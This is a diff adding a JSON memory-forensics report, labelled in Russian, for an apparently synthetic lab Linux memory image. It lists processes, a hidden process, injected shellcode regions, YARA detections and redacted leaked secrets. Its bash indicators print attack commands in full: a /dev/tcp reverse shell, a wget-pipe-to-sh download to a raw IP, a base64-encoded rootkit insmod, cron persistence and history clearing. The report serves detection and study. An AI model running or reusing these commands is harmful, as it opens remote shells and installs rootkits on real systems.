@@ -1,0 +1,1812 @@
+{
+  "title": "LMA 2.1 — отчёт анализа образа памяти",
+  "created": "2026-11-14 19:03:02",
+  "sections": {
+    "IMAGE": {
+      "path": "/workspace/lma2/build/lab/memory_lab.raw",
+      "size_bytes": 134217728,
+      "size_human": "128.0 MiB"
+    },
+    "ENVIRONMENT": {
+      "python": "3.12.15",
+      "volatility3": null,
+      "yara": "4.5.4",
+      "dwarf2json": null
+    },
+    "KERNEL": {
+      "version": "6.17.0-19-generic",
+      "banner": "Linux version 6.17.0-19-generic (buildd@lcy02-amd64-073) (x86_64-linux-gnu-gcc-13 (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0) #20~24.04.2-Ubuntu SMP PREEMPT_DYNAMIC Fri Oct 24 12:00:00 UTC 2025",
+      "offset": 4096,
+      "occurrences": 6,
+      "candidates": [
+        {
+          "version": "6.17.0-19-generic",
+          "count": 6
+        },
+        {
+          "version": "5.15.0-25-generic",
+          "count": 1
+        }
+      ],
+      "compiler": null,
+      "build": "#20~24.04.2-Ubuntu SMP PREEMPT_DYNAMIC Fri Oct 24 12:00:00 UTC 2025",
+      "arch": "x86_64",
+      "confidence": 0.852,
+      "scanned_bytes": 134217728
+    },
+    "PROFILE": {
+      "ok": true,
+      "source": "fixture_stand",
+      "path": null,
+      "seconds": 0.0,
+      "detail": "не требуется: артефакты читаются из фикстур плагинов"
+    },
+    "PROCESSES": [
+      {
+        "pid": 1,
+        "tid": 1,
+        "ppid": 0,
+        "name": "systemd",
+        "uid": 0,
+        "offset": 18446614335632445440,
+        "created": "2026-11-14T19:55:00+00:00"
+      },
+      {
+        "pid": 2,
+        "tid": 2,
+        "ppid": 0,
+        "name": "kthreadd",
+        "uid": 0,
+        "offset": 18446614335632449536,
+        "created": "2026-11-14T19:55:00+00:00"
+      },
+      {
+        "pid": 910,
+        "tid": 910,
+        "ppid": 1,
+        "name": "sshd",
+        "uid": 0,
+        "offset": 18446614335632453632,
+        "created": "2026-11-14T19:55:00+00:00"
+      },
+      {
+        "pid": 1450,
+        "tid": 1450,
+        "ppid": 1,
+        "name": "nginx",
+        "uid": 33,
+        "offset": 18446614335632457728,
+        "created": "2026-11-14T19:55:00+00:00"
+      },
+      {
+        "pid": 2100,
+        "tid": 2100,
+        "ppid": 910,
+        "name": "bash",
+        "uid": 1000,
+        "offset": 18446614335632461824,
+        "created": "2026-11-14T19:55:00+00:00"
+      },
+      {
+        "pid": 3100,
+        "tid": 3100,
+        "ppid": 2100,
+        "name": "python3",
+        "uid": 1000,
+        "offset": 18446614335632465920,
+        "created": "2026-11-14T19:55:00+00:00"
+      },
+      {
+        "pid": 3300,
+        "tid": 3300,
+        "ppid": 2100,
+        "name": "defunct",
+        "uid": 1000,
+        "offset": 18446614335632470016,
+        "created": "2026-11-14T19:55:00+00:00"
+      },
+      {
+        "pid": 4100,
+        "tid": 4100,
+        "ppid": 1,
+        "name": "kworker/u8:2",
+        "uid": 0,
+        "offset": 18446614335632474112,
+        "created": "2026-11-14T19:55:00+00:00"
+      },
+      {
+        "pid": 4300,
+        "tid": 4300,
+        "ppid": 2100,
+        "name": "vol.py",
+        "uid": 1000,
+        "offset": 18446614335632478208,
+        "created": "2026-11-14T19:55:00+00:00"
+      }
+    ],
+    "CROSS_VIEW": {
+      "hidden": [
+        {
+          "pid": 4242,
+          "tid": 4242,
+          "ppid": 1,
+          "name": "kworker/u8:3",
+          "exit_state": "TASK_RUNNING",
+          "offset": 4295094272
+        }
+      ],
+      "rejected": {
+        "thread": [
+          {
+            "pid": 1450,
+            "tid": 1451,
+            "ppid": 1,
+            "name": "nginx",
+            "exit_state": "TASK_RUNNING",
+            "offset": 4295008256
+          },
+          {
+            "pid": 1450,
+            "tid": 1452,
+            "ppid": 1,
+            "name": "nginx",
+            "exit_state": "TASK_RUNNING",
+            "offset": 4295012352
+          },
+          {
+            "pid": 3100,
+            "tid": 3101,
+            "ppid": 2100,
+            "name": "python3",
+            "exit_state": "TASK_RUNNING",
+            "offset": 4295016448
+          },
+          {
+            "pid": 3100,
+            "tid": 3102,
+            "ppid": 2100,
+            "name": "python3",
+            "exit_state": "TASK_RUNNING",
+            "offset": 4295020544
+          },
+          {
+            "pid": 3100,
+            "tid": 3103,
+            "ppid": 2100,
+            "name": "python3",
+            "exit_state": "TASK_RUNNING",
+            "offset": 4295024640
+          },
+          {
+            "pid": 4300,
+            "tid": 4301,
+            "ppid": 2100,
+            "name": "vol.py",
+            "exit_state": "TASK_RUNNING",
+            "offset": 4295028736
+          }
+        ],
+        "exited": [
+          {
+            "pid": 3350,
+            "tid": 3350,
+            "ppid": 2100,
+            "name": "sleep",
+            "exit_state": "EXIT_DEAD",
+            "offset": 4295159808
+          }
+        ],
+        "known": 9
+      },
+      "stats": {
+        "pslist_tasks": 9,
+        "psscan_tasks": 17,
+        "hidden": 1,
+        "rejected_threads": 6,
+        "rejected_exited": 1
+      },
+      "naive_hidden": [
+        3350,
+        4242
+      ]
+    },
+    "BASH": {
+      "iocs": [
+        {
+          "pid": 2100,
+          "process": "bash",
+          "timestamp": "2026-11-14T20:14:41+00:00",
+          "command": "bash -i >& /dev/tcp/45.13.22.7/4444 0>&1",
+          "rule": "BASH_RShell_DevTcp",
+          "reason": "обратная оболочка через /dev/tcp",
+          "severity": "critical",
+          "mitre": "T1059.004",
+          "all_rules": [
+            "BASH_RShell_DevTcp",
+            "BASH_RShell_Interactive"
+          ]
+        },
+        {
+          "pid": 2100,
+          "process": "bash",
+          "timestamp": "2026-11-14T20:14:02+00:00",
+          "command": "wget -qO- http://45.13.22.7/stage.sh | sh",
+          "rule": "BASH_Download_Exec",
+          "reason": "загрузка и немедленное исполнение кода из сети",
+          "severity": "high",
+          "mitre": "T1105",
+          "all_rules": [
+            "BASH_Download_Exec",
+            "BASH_Download"
+          ]
+        },
+        {
+          "pid": 2100,
+          "process": "bash",
+          "timestamp": "2026-11-14T20:15:03+00:00",
+          "command": "echo aW5zbW9kIC90bXAvLmhpZGUvZGlhbW9ycGhpbmUua28K | base64 -d | sh",
+          "rule": "BASH_Deobfuscate",
+          "reason": "деобфускация и исполнение полезной нагрузки",
+          "severity": "high",
+          "mitre": "T1140",
+          "all_rules": [
+            "BASH_Deobfuscate",
+            "BASH_Base64"
+          ]
+        },
+        {
+          "pid": 2100,
+          "process": "bash",
+          "timestamp": "2026-11-14T20:15:22+00:00",
+          "command": "insmod /tmp/.hide/diamorphine.ko",
+          "rule": "BASH_Module_Load",
+          "reason": "загрузка модуля ядра",
+          "severity": "high",
+          "mitre": "T1547.006",
+          "all_rules": [
+            "BASH_Module_Load"
+          ]
+        },
+        {
+          "pid": 2100,
+          "process": "bash",
+          "timestamp": "2026-11-14T20:16:31+00:00",
+          "command": "history -c",
+          "rule": "BASH_AntiForensics",
+          "reason": "сокрытие следов активности (очистка истории)",
+          "severity": "high",
+          "mitre": "T1070.003",
+          "all_rules": [
+            "BASH_AntiForensics"
+          ]
+        },
+        {
+          "pid": 2100,
+          "process": "bash",
+          "timestamp": "2026-11-14T20:16:10+00:00",
+          "command": "crontab -l | { cat; echo \"* * * * * /tmp/.x/kworker\"; } | crontab -",
+          "rule": "BASH_Persistence",
+          "reason": "закрепление в системе (автозапуск)",
+          "severity": "medium",
+          "mitre": "T1053.003",
+          "all_rules": [
+            "BASH_Persistence"
+          ]
+        },
+        {
+          "pid": 2100,
+          "process": "bash",
+          "timestamp": "2026-11-14T20:14:19+00:00",
+          "command": "chmod +x /tmp/.x/kworker",
+          "rule": "BASH_ChmodExec",
+          "reason": "выдача прав на исполнение",
+          "severity": "low",
+          "mitre": "T1222.002",
+          "all_rules": [
+            "BASH_ChmodExec"
+          ]
+        }
+      ],
+      "suppressed": [
+        {
+          "pid": 2100,
+          "process": "bash",
+          "timestamp": "2026-11-14T19:58:11+00:00",
+          "command": "wget https://archive.ubuntu.com/ubuntu/pool/main/v/vim/vim_9.1.0-1ubuntu1_amd64.deb",
+          "rule": "BASH_Download",
+          "reason": "загрузка файла из сети",
+          "severity": "medium",
+          "mitre": "T1105",
+          "all_rules": [
+            "BASH_Download"
+          ],
+          "suppressed_because": "загрузка из доверенного репозитория (archive.ubuntu.com)"
+        },
+        {
+          "pid": 2100,
+          "process": "bash",
+          "timestamp": "2026-11-14T20:01:44+00:00",
+          "command": "chmod +x ./configure",
+          "rule": "BASH_ChmodExec",
+          "reason": "выдача прав на исполнение",
+          "severity": "low",
+          "mitre": "T1222.002",
+          "all_rules": [
+            "BASH_ChmodExec"
+          ],
+          "suppressed_because": "выдача прав в контексте сборки/скрипта проекта"
+        },
+        {
+          "pid": 2100,
+          "process": "bash",
+          "timestamp": "2026-11-14T20:03:02+00:00",
+          "command": "curl https://raw.githubusercontent.com/volatilityfoundation/volatility3/master/README.md",
+          "rule": "BASH_Download",
+          "reason": "загрузка файла из сети",
+          "severity": "medium",
+          "mitre": "T1105",
+          "all_rules": [
+            "BASH_Download"
+          ],
+          "suppressed_because": "загрузка из доверенного репозитория (raw.githubusercontent.com)"
+        }
+      ],
+      "stats": {
+        "commands": 14,
+        "iocs": 7,
+        "suppressed": 3
+      }
+    },
+    "INJECTIONS": {
+      "regions": [
+        {
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "start": 139637976727552,
+          "end": 139637976825856,
+          "protection": "rwx",
+          "path": "",
+          "region_file": "build/lab/regions/pid.4242.vma.0x7f0000000000.0x7f0000018000.dmp",
+          "size": 98304,
+          "entropy": 7.999,
+          "printable": 0.383,
+          "nulls": 0.004,
+          "sha256": "44439b744f11affe093652836beac61b80f04df72a3603a0e08ff307ab94d864",
+          "verdict": "packed_or_encrypted",
+          "severity": "critical",
+          "scan": true,
+          "why": "энтропия 7.999 ≥ 7.2: упакованная/шифрованная нагрузка",
+          "yara": [
+            {
+              "rule": "Linux_Injection_Shellcode_Socket_x64",
+              "category": "malware",
+              "severity": "critical",
+              "mitre": "T1055",
+              "description": "Shellcode x86-64: socket(AF_INET, SOCK_STREAM) через syscall",
+              "reference": "https://attack.mitre.org/techniques/T1055/",
+              "string_id": "$sc1",
+              "offset": 0,
+              "length": 10,
+              "snippet": "j)X·j·_j·^",
+              "pid": 4242,
+              "process": "kworker/u8:3",
+              "start": 139637976727552,
+              "region": "vma"
+            },
+            {
+              "rule": "Linux_Injection_Shellcode_Socket_x64",
+              "category": "malware",
+              "severity": "critical",
+              "mitre": "T1055",
+              "description": "Shellcode x86-64: socket(AF_INET, SOCK_STREAM) через syscall",
+              "reference": "https://attack.mitre.org/techniques/T1055/",
+              "string_id": "$sc3",
+              "offset": 10,
+              "length": 12,
+              "snippet": "H1·H1·H1·H1·",
+              "pid": 4242,
+              "process": "kworker/u8:3",
+              "start": 139637976727552,
+              "region": "vma"
+            },
+            {
+              "rule": "Linux_Injection_Shellcode_Socket_x64",
+              "category": "malware",
+              "severity": "critical",
+              "mitre": "T1055",
+              "description": "Shellcode x86-64: socket(AF_INET, SOCK_STREAM) через syscall",
+              "reference": "https://attack.mitre.org/techniques/T1055/",
+              "string_id": "$sys",
+              "offset": 22,
+              "length": 2,
+              "snippet": "··",
+              "pid": 4242,
+              "process": "kworker/u8:3",
+              "start": 139637976727552,
+              "region": "vma"
+            },
+            {
+              "rule": "Linux_Injection_Shellcode_Socket_x64",
+              "category": "malware",
+              "severity": "critical",
+              "mitre": "T1055",
+              "description": "Shellcode x86-64: socket(AF_INET, SOCK_STREAM) через syscall",
+              "reference": "https://attack.mitre.org/techniques/T1055/",
+              "string_id": "$sh",
+              "offset": 24,
+              "length": 7,
+              "snippet": "/bin/sh",
+              "pid": 4242,
+              "process": "kworker/u8:3",
+              "start": 139637976727552,
+              "region": "vma"
+            },
+            {
+              "rule": "Linux_Injection_Shellcode_Socket_x64",
+              "category": "malware",
+              "severity": "critical",
+              "mitre": "T1055",
+              "description": "Shellcode x86-64: socket(AF_INET, SOCK_STREAM) через syscall",
+              "reference": "https://attack.mitre.org/techniques/T1055/",
+              "string_id": "$sys",
+              "offset": 44192,
+              "length": 2,
+              "snippet": "··",
+              "pid": 4242,
+              "process": "kworker/u8:3",
+              "start": 139637976727552,
+              "region": "vma"
+            },
+            {
+              "rule": "Linux_Injection_Shellcode_Socket_x64",
+              "category": "malware",
+              "severity": "critical",
+              "mitre": "T1055",
+              "description": "Shellcode x86-64: socket(AF_INET, SOCK_STREAM) через syscall",
+              "reference": "https://attack.mitre.org/techniques/T1055/",
+              "string_id": "$sys",
+              "offset": 74810,
+              "length": 2,
+              "snippet": "··",
+              "pid": 4242,
+              "process": "kworker/u8:3",
+              "start": 139637976727552,
+              "region": "vma"
+            }
+          ]
+        },
+        {
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "start": 139637979873280,
+          "end": 139637979922432,
+          "protection": "rwx",
+          "path": "",
+          "region_file": "build/lab/regions/pid.4242.vma.0x7f0000300000.0x7f000030c000.dmp",
+          "size": 49152,
+          "entropy": 7.996,
+          "printable": 0.379,
+          "nulls": 0.005,
+          "sha256": "a5193f5c7adbf4c57b72d7ff1d62f7c1aed8a87da46fc7bf28b1ed0202a8c324",
+          "verdict": "packed_or_encrypted",
+          "severity": "high",
+          "scan": true,
+          "why": "энтропия 7.996 ≥ 7.2: упакованная/шифрованная нагрузка",
+          "yara": [
+            {
+              "rule": "Linux_Injection_ELF_Header_In_Anon_VMA",
+              "category": "malware",
+              "severity": "high",
+              "mitre": "T1055.009",
+              "description": "ELF-образ в анонимной области памяти (отражённая загрузка)",
+              "reference": "https://attack.mitre.org/techniques/T1055/009/",
+              "string_id": "$elf64",
+              "offset": 0,
+              "length": 7,
+              "snippet": "·ELF···",
+              "pid": 4242,
+              "process": "kworker/u8:3",
+              "start": 139637979873280,
+              "region": "vma"
+            },
+            {
+              "rule": "Linux_Injection_Packed_High_Entropy",
+              "category": "malware",
+              "severity": "medium",
+              "mitre": "T1027.002",
+              "description": "Признаки упаковщика в исполняемой области (UPX)",
+              "reference": "https://attack.mitre.org/techniques/T1027/002/",
+              "string_id": "$upx0",
+              "offset": 64,
+              "length": 4,
+              "snippet": "UPX!",
+              "pid": 4242,
+              "process": "kworker/u8:3",
+              "start": 139637979873280,
+              "region": "vma"
+            },
+            {
+              "rule": "Linux_Injection_Packed_High_Entropy",
+              "category": "malware",
+              "severity": "medium",
+              "mitre": "T1027.002",
+              "description": "Признаки упаковщика в исполняемой области (UPX)",
+              "reference": "https://attack.mitre.org/techniques/T1027/002/",
+              "string_id": "$upx1",
+              "offset": 74,
+              "length": 32,
+              "snippet": "This file is packed with the UPX",
+              "pid": 4242,
+              "process": "kworker/u8:3",
+              "start": 139637979873280,
+              "region": "vma"
+            }
+          ]
+        }
+      ],
+      "dropped": [
+        {
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "start": 139637977776128,
+          "end": 139637977841664,
+          "protection": "rwx",
+          "path": "",
+          "region_file": "build/lab/regions/pid.4242.vma.0x7f0000100000.0x7f0000110000.dmp",
+          "size": 65536,
+          "entropy": 0.0,
+          "printable": 0.0,
+          "nulls": 1.0,
+          "sha256": "de2f256064a0af797747c2b97505dc0b9f3df0de4f489eac731c23ae9ca9cc31",
+          "verdict": "zero_padding",
+          "severity": "info",
+          "scan": false,
+          "why": "нулевое заполнение (энтропия 0.0)"
+        },
+        {
+          "pid": 1450,
+          "process": "nginx",
+          "start": 139706696204288,
+          "end": 139706696237056,
+          "protection": "rwx",
+          "path": "",
+          "region_file": "build/lab/regions/pid.1450.vma.0x7f1000000000.0x7f1000008000.dmp",
+          "size": 32768,
+          "entropy": 1.462,
+          "printable": 1.0,
+          "nulls": 0.0,
+          "sha256": "461fa138cfbc99d543298a6c44415cce0c14005b1161cb2687d35c51db283fd0",
+          "verdict": "text_data",
+          "severity": "low",
+          "scan": false,
+          "why": "текстовые данные (printable=1.0, энтропия 1.462)"
+        }
+      ],
+      "stats": {
+        "regions_total": 4,
+        "regions_scanned": 2,
+        "regions_dropped": 2,
+        "bytes_total": 245760,
+        "bytes_scanned": 147456,
+        "prefilter_ratio": 0.4,
+        "findings": 9
+      }
+    },
+    "YARA": {
+      "mode": "hybrid",
+      "seconds": 0.258,
+      "bytes": 134217728,
+      "throughput_mibs": 496.1,
+      "full_image_findings": 20,
+      "attributed": 20,
+      "findings": [
+        {
+          "rule": "Linux_Injection_Shellcode_Socket_x64",
+          "category": "malware",
+          "severity": "critical",
+          "mitre": "T1055",
+          "description": "Shellcode x86-64: socket(AF_INET, SOCK_STREAM) через syscall",
+          "reference": "https://attack.mitre.org/techniques/T1055/",
+          "string_id": "$sc1",
+          "offset": 0,
+          "length": 10,
+          "snippet": "j)X·j·_j·^",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "start": 139637976727552,
+          "region": "vma"
+        },
+        {
+          "rule": "Linux_Injection_Shellcode_Socket_x64",
+          "category": "malware",
+          "severity": "critical",
+          "mitre": "T1055",
+          "description": "Shellcode x86-64: socket(AF_INET, SOCK_STREAM) через syscall",
+          "reference": "https://attack.mitre.org/techniques/T1055/",
+          "string_id": "$sc3",
+          "offset": 10,
+          "length": 12,
+          "snippet": "H1·H1·H1·H1·",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "start": 139637976727552,
+          "region": "vma"
+        },
+        {
+          "rule": "Linux_Injection_Shellcode_Socket_x64",
+          "category": "malware",
+          "severity": "critical",
+          "mitre": "T1055",
+          "description": "Shellcode x86-64: socket(AF_INET, SOCK_STREAM) через syscall",
+          "reference": "https://attack.mitre.org/techniques/T1055/",
+          "string_id": "$sys",
+          "offset": 22,
+          "length": 2,
+          "snippet": "··",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "start": 139637976727552,
+          "region": "vma"
+        },
+        {
+          "rule": "Linux_Injection_Shellcode_Socket_x64",
+          "category": "malware",
+          "severity": "critical",
+          "mitre": "T1055",
+          "description": "Shellcode x86-64: socket(AF_INET, SOCK_STREAM) через syscall",
+          "reference": "https://attack.mitre.org/techniques/T1055/",
+          "string_id": "$sh",
+          "offset": 24,
+          "length": 7,
+          "snippet": "/bin/sh",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "start": 139637976727552,
+          "region": "vma"
+        },
+        {
+          "rule": "Linux_Injection_Shellcode_Socket_x64",
+          "category": "malware",
+          "severity": "critical",
+          "mitre": "T1055",
+          "description": "Shellcode x86-64: socket(AF_INET, SOCK_STREAM) через syscall",
+          "reference": "https://attack.mitre.org/techniques/T1055/",
+          "string_id": "$sys",
+          "offset": 44192,
+          "length": 2,
+          "snippet": "··",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "start": 139637976727552,
+          "region": "vma"
+        },
+        {
+          "rule": "Linux_Injection_Shellcode_Socket_x64",
+          "category": "malware",
+          "severity": "critical",
+          "mitre": "T1055",
+          "description": "Shellcode x86-64: socket(AF_INET, SOCK_STREAM) через syscall",
+          "reference": "https://attack.mitre.org/techniques/T1055/",
+          "string_id": "$sys",
+          "offset": 74810,
+          "length": 2,
+          "snippet": "··",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "start": 139637976727552,
+          "region": "vma"
+        },
+        {
+          "rule": "Linux_Malware_Reverse_Shell",
+          "category": "malware",
+          "severity": "critical",
+          "mitre": "T1059.004",
+          "description": "Обратная оболочка: netcat -e, bash -i через /dev/tcp",
+          "reference": "https://attack.mitre.org/techniques/T1059/004/",
+          "string_id": "$bi",
+          "offset": 1048643,
+          "length": 20,
+          "snippet": "bash -i >& /dev/tcp/",
+          "region": "full_image",
+          "pid": 2100,
+          "process": "bash",
+          "attribution": "memory_map"
+        },
+        {
+          "rule": "Linux_Injection_Shellcode_Socket_x64",
+          "category": "malware",
+          "severity": "critical",
+          "mitre": "T1055",
+          "description": "Shellcode x86-64: socket(AF_INET, SOCK_STREAM) через syscall",
+          "reference": "https://attack.mitre.org/techniques/T1055/",
+          "string_id": "$sc1",
+          "offset": 8388608,
+          "length": 10,
+          "snippet": "j)X·j·_j·^",
+          "region": "full_image",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "attribution": "memory_map"
+        },
+        {
+          "rule": "Linux_Injection_Shellcode_Socket_x64",
+          "category": "malware",
+          "severity": "critical",
+          "mitre": "T1055",
+          "description": "Shellcode x86-64: socket(AF_INET, SOCK_STREAM) через syscall",
+          "reference": "https://attack.mitre.org/techniques/T1055/",
+          "string_id": "$sc3",
+          "offset": 8388618,
+          "length": 12,
+          "snippet": "H1·H1·H1·H1·",
+          "region": "full_image",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "attribution": "memory_map"
+        },
+        {
+          "rule": "Linux_Injection_Shellcode_Socket_x64",
+          "category": "malware",
+          "severity": "critical",
+          "mitre": "T1055",
+          "description": "Shellcode x86-64: socket(AF_INET, SOCK_STREAM) через syscall",
+          "reference": "https://attack.mitre.org/techniques/T1055/",
+          "string_id": "$sys",
+          "offset": 8388630,
+          "length": 2,
+          "snippet": "··",
+          "region": "full_image",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "attribution": "memory_map"
+        },
+        {
+          "rule": "Linux_Injection_Shellcode_Socket_x64",
+          "category": "malware",
+          "severity": "critical",
+          "mitre": "T1055",
+          "description": "Shellcode x86-64: socket(AF_INET, SOCK_STREAM) через syscall",
+          "reference": "https://attack.mitre.org/techniques/T1055/",
+          "string_id": "$sh",
+          "offset": 8388632,
+          "length": 7,
+          "snippet": "/bin/sh",
+          "region": "full_image",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "attribution": "memory_map"
+        },
+        {
+          "rule": "Linux_Injection_Shellcode_Socket_x64",
+          "category": "malware",
+          "severity": "critical",
+          "mitre": "T1055",
+          "description": "Shellcode x86-64: socket(AF_INET, SOCK_STREAM) через syscall",
+          "reference": "https://attack.mitre.org/techniques/T1055/",
+          "string_id": "$sys",
+          "offset": 8432800,
+          "length": 2,
+          "snippet": "··",
+          "region": "full_image",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "attribution": "memory_map"
+        },
+        {
+          "rule": "Linux_Injection_Shellcode_Socket_x64",
+          "category": "malware",
+          "severity": "critical",
+          "mitre": "T1055",
+          "description": "Shellcode x86-64: socket(AF_INET, SOCK_STREAM) через syscall",
+          "reference": "https://attack.mitre.org/techniques/T1055/",
+          "string_id": "$sys",
+          "offset": 8463418,
+          "length": 2,
+          "snippet": "··",
+          "region": "full_image",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "attribution": "memory_map"
+        },
+        {
+          "rule": "Linux_Injection_ELF_Header_In_Anon_VMA",
+          "category": "malware",
+          "severity": "high",
+          "mitre": "T1055.009",
+          "description": "ELF-образ в анонимной области памяти (отражённая загрузка)",
+          "reference": "https://attack.mitre.org/techniques/T1055/009/",
+          "string_id": "$elf64",
+          "offset": 0,
+          "length": 7,
+          "snippet": "·ELF···",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "start": 139637979873280,
+          "region": "vma"
+        },
+        {
+          "rule": "Linux_Malware_Download_And_Execute",
+          "category": "malware",
+          "severity": "high",
+          "mitre": "T1105",
+          "description": "Загрузка кода из сети с немедленным исполнением (wget|curl ... | sh)",
+          "reference": "https://attack.mitre.org/techniques/T1105/",
+          "string_id": "$pipe",
+          "offset": 1048576,
+          "length": 41,
+          "snippet": "wget -qO- http://45.13.22.7/stage.sh | sh",
+          "region": "full_image",
+          "pid": 2100,
+          "process": "bash",
+          "attribution": "memory_map"
+        },
+        {
+          "rule": "Linux_Malware_Encoded_Payload_Exec",
+          "category": "malware",
+          "severity": "high",
+          "mitre": "T1140",
+          "description": "Деобфускация полезной нагрузки base64 с передачей интерпретатору",
+          "reference": "https://attack.mitre.org/techniques/T1140/",
+          "string_id": "$echo",
+          "offset": 1048684,
+          "length": 58,
+          "snippet": "echo aW5zbW9kIC90bXAvLmhpZGUvZGlhbW9ycGhpbmUua28",
+          "region": "full_image",
+          "pid": 2100,
+          "process": "bash",
+          "attribution": "memory_map"
+        },
+        {
+          "rule": "Linux_Malware_Kernel_Module_Loader",
+          "category": "malware",
+          "severity": "high",
+          "mitre": "T1547.006",
+          "description": "Загрузка стороннего модуля ядра (возможный руткит/LKM)",
+          "reference": "https://attack.mitre.org/techniques/T1547/006/",
+          "string_id": "$i1",
+          "offset": 1048751,
+          "length": 32,
+          "snippet": "insmod /tmp/.hide/diamorphine.ko",
+          "region": "full_image",
+          "pid": 2100,
+          "process": "bash",
+          "attribution": "memory_map"
+        },
+        {
+          "rule": "Linux_Malware_AntiForensics_History",
+          "category": "malware",
+          "severity": "high",
+          "mitre": "T1070.003",
+          "description": "Сокрытие следов активности: очистка истории команд",
+          "reference": "https://attack.mitre.org/techniques/T1070/003/",
+          "string_id": "$h1",
+          "offset": 1048852,
+          "length": 10,
+          "snippet": "history -c",
+          "region": "full_image",
+          "pid": 2100,
+          "process": "bash",
+          "attribution": "memory_map"
+        },
+        {
+          "rule": "Linux_Secret_Private_Key_PEM",
+          "category": "secrets",
+          "severity": "high",
+          "mitre": "T1552.004",
+          "description": "Приватный ключ в формате PEM/OpenSSH/PuTTY (тело ключа обязательно)",
+          "reference": "https://attack.mitre.org/techniques/T1552/004/",
+          "string_id": "$pem",
+          "offset": 4194304,
+          "length": 95,
+          "snippet": "-----BEGIN R…[REDACTED] sha256:94b1117af5e4f766",
+          "region": "full_image",
+          "pid": 3100,
+          "process": "python3",
+          "attribution": "memory_map"
+        },
+        {
+          "rule": "Linux_Secret_Cloud_Token",
+          "category": "secrets",
+          "severity": "high",
+          "mitre": "T1552.001",
+          "description": "Токены доступа: AWS, GitHub, Slack, JWT, Google API",
+          "reference": "https://attack.mitre.org/techniques/T1552/001/",
+          "string_id": "$aws_id",
+          "offset": 4194578,
+          "length": 20,
+          "snippet": "AKIAIOSFODNN…[REDACTED] sha256:1a5d44a2dca19669",
+          "region": "full_image",
+          "pid": 3100,
+          "process": "python3",
+          "attribution": "memory_map"
+        },
+        {
+          "rule": "Linux_Secret_Cloud_Token",
+          "category": "secrets",
+          "severity": "high",
+          "mitre": "T1552.001",
+          "description": "Токены доступа: AWS, GitHub, Slack, JWT, Google API",
+          "reference": "https://attack.mitre.org/techniques/T1552/001/",
+          "string_id": "$gh",
+          "offset": 4194676,
+          "length": 40,
+          "snippet": "ghp_16C7e42F…[REDACTED] sha256:3543c50b0cb9cea8",
+          "region": "full_image",
+          "pid": 3100,
+          "process": "python3",
+          "attribution": "memory_map"
+        },
+        {
+          "rule": "Linux_Secret_Cloud_Token",
+          "category": "secrets",
+          "severity": "high",
+          "mitre": "T1552.001",
+          "description": "Токены доступа: AWS, GitHub, Slack, JWT, Google API",
+          "reference": "https://attack.mitre.org/techniques/T1552/001/",
+          "string_id": "$slack",
+          "offset": 4194729,
+          "length": 51,
+          "snippet": "xoxb-2785493…[REDACTED] sha256:81247f15ef70f67e",
+          "region": "full_image",
+          "pid": 3100,
+          "process": "python3",
+          "attribution": "memory_map"
+        },
+        {
+          "rule": "Linux_Secret_Cloud_Token",
+          "category": "secrets",
+          "severity": "high",
+          "mitre": "T1552.001",
+          "description": "Токены доступа: AWS, GitHub, Slack, JWT, Google API",
+          "reference": "https://attack.mitre.org/techniques/T1552/001/",
+          "string_id": "$jwt",
+          "offset": 4194803,
+          "length": 92,
+          "snippet": "eyJhbGciOiJI…[REDACTED] sha256:7c5b0229189828de",
+          "region": "full_image",
+          "pid": 3100,
+          "process": "python3",
+          "attribution": "memory_map"
+        },
+        {
+          "rule": "Linux_Secret_DB_Connection_String",
+          "category": "secrets",
+          "severity": "high",
+          "mitre": "T1552.001",
+          "description": "Строка подключения к БД с паролем в открытом виде",
+          "reference": "https://attack.mitre.org/techniques/T1552/001/",
+          "string_id": "$pg",
+          "offset": 4194909,
+          "length": 52,
+          "snippet": "postgresql:/…[REDACTED] sha256:6047d0b5c6de1d3c",
+          "region": "full_image",
+          "pid": 3100,
+          "process": "python3",
+          "attribution": "memory_map"
+        },
+        {
+          "rule": "Linux_Injection_Packed_High_Entropy",
+          "category": "malware",
+          "severity": "medium",
+          "mitre": "T1027.002",
+          "description": "Признаки упаковщика в исполняемой области (UPX)",
+          "reference": "https://attack.mitre.org/techniques/T1027/002/",
+          "string_id": "$upx0",
+          "offset": 64,
+          "length": 4,
+          "snippet": "UPX!",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "start": 139637979873280,
+          "region": "vma"
+        },
+        {
+          "rule": "Linux_Injection_Packed_High_Entropy",
+          "category": "malware",
+          "severity": "medium",
+          "mitre": "T1027.002",
+          "description": "Признаки упаковщика в исполняемой области (UPX)",
+          "reference": "https://attack.mitre.org/techniques/T1027/002/",
+          "string_id": "$upx1",
+          "offset": 74,
+          "length": 32,
+          "snippet": "This file is packed with the UPX",
+          "pid": 4242,
+          "process": "kworker/u8:3",
+          "start": 139637979873280,
+          "region": "vma"
+        },
+        {
+          "rule": "Linux_Secret_Shadow_Hash",
+          "category": "secrets",
+          "severity": "medium",
+          "mitre": "T1003.008",
+          "description": "Строка /etc/shadow с хешем пароля (полная структура, не фрагмент)",
+          "reference": "https://attack.mitre.org/techniques/T1003/008/",
+          "string_id": "$line",
+          "offset": 4194975,
+          "length": 96,
+          "snippet": "nikita:$6$ru…[REDACTED] sha256:45ac9911658c30f6",
+          "region": "full_image",
+          "pid": 3100,
+          "process": "python3",
+          "attribution": "memory_map"
+        },
+        {
+          "rule": "Linux_Injection_Packed_High_Entropy",
+          "category": "malware",
+          "severity": "medium",
+          "mitre": "T1027.002",
+          "description": "Признаки упаковщика в исполняемой области (UPX)",
+          "reference": "https://attack.mitre.org/techniques/T1027/002/",
+          "string_id": "$upx0",
+          "offset": 11534400,
+          "length": 4,
+          "snippet": "UPX!",
+          "region": "full_image",
+          "pid": 4242,
